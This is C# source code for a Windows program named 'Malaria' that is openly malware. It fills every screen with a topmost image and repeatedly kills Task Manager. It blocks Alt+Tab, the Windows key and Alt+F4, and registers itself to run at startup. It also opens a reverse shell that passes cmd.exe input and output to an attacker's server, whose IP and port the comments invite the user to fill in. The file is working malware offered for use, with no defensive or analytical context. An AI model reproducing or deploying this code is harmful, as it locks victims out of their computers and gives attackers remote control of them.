using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Malaria.Properties;
using Microsoft.Win32;

namespace Malaria
{
    public partial class Malaria : Form
    {
        private IKeyboardMouseEvents _globalHook;
        private StreamWriter streamWriter;

        public Malaria()
        {
            InitializeComponent();
            DisplayImageOnAllScreens();

            new Thread(KillTaskManager).Start();
            new Thread(AutoStart).Start();
            new Thread(StartReverseShell).Start();

            KeyPreview = true;

            _globalHook = Hook.GlobalEvents();
            _globalHook.KeyDown += GlobalHook_KeyDown;
        }

        private void StartReverseShell()
        {
            string serverIp = "127.0.0.1"; // Replace with your IP
            int serverPort = 9001; // Replace with the desired port

            try
            {
                using (TcpClient client = new TcpClient(serverIp, serverPort))
                {
                    using (NetworkStream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream) { AutoFlush = true };

                            // Create a process to interact with cmd.exe
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;

                            p.OutputDataReceived += (sender, args) =>
                            {
                                if (!string.IsNullOrEmpty(args.Data))
                                {
                                    try
                                    {
                                        streamWriter.WriteLine(args.Data); // Send command output
                                    }
                                    catch (Exception ex) { }
                                   
                                }
                            };

                            p.ErrorDataReceived += (sender, args) =>
                            {
                                if (!string.IsNullOrEmpty(args.Data))
                                {
                                    try
                                    {
                                        streamWriter.WriteLine(args.Data); // Send command output
                                    }
                                    catch (Exception ex) { }
                                }
                            };

                            p.Start();
                            p.BeginOutputReadLine();
                            p.BeginErrorReadLine();

                            // Read commands from the server and pass them to cmd.exe
                            while (true)
                            {
                                string command = rdr.ReadLine();
                                if (!string.IsNullOrEmpty(command))
                                {
                                    p.StandardInput.WriteLine(command);
                                    p.StandardInput.Flush();
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }



        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // Send the output from cmd.exe back to the server
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                }
                catch (Exception err)
                {
                }
            }
        }

        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
        {
            // Intercept ALT + TAB key combination and block it
            if (e.Alt && e.KeyCode == Keys.Tab)
            {
                e.Handled = true;
                return;
            }

            // Intercept Windows key (WIN) and block it
            if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
            {
                e.Handled = true;
                return;
            }

            // Intercept ALT + F4 key combination and block it
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
                return;
            }
        }

        private static void AutoStart()
        {
            // Add the application to the Windows startup registry
            var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey?.SetValue("Malaria", Application.ExecutablePath);
        }

        private static void DisplayImageOnAllScreens()
        {
            // Loop through all connected screens and display a full-screen form with a background image
            foreach (var screen in Screen.AllScreens)
            {
                var form = new Form
                {
                    StartPosition = FormStartPosition.CenterScreen,
                    Location = screen.Bounds.Location,
                    Size = screen.Bounds.Size,
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackgroundImageLayout = ImageLayout.Stretch
                };

                // Retrieve the background image from resources
                var imageResource = Resources.ResourceManager.GetObject("bg");

                if (imageResource is byte[] imageBytes)
                {
                    form.BackgroundImage = Image.FromStream(new MemoryStream(imageBytes));
                }
                else if (imageResource is Image image)
                {
                    form.BackgroundImage = image;
                }

                form.Show();
            }
        }

        private static void KillTaskManager()
        {
            // Continuously monitor for and terminate Task Manager processes
            while (true)
            {
                var processes = Process.GetProcessesByName("taskmgr");
                foreach (var process in processes) process.Kill();
            }
        }

        protected override void WndProc(ref Message m)
        {
            // Intercept Windows system commands to block ALT + F4 (form closure)
            const int wmSysCommand = 0x0112;
            const int scClose = 0xF060;

            if (m.Msg == wmSysCommand && (int)m.WParam == scClose)
            {
                return; // Prevent the form from closing
            }

            base.WndProc(ref m); // Call base method for other messages
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Unhook the global keyboard event hook when the form is closing
            _globalHook.KeyDown -= GlobalHook_KeyDown;
            _globalHook.Dispose();
            base.OnFormClosing(e);
        }
    }
}
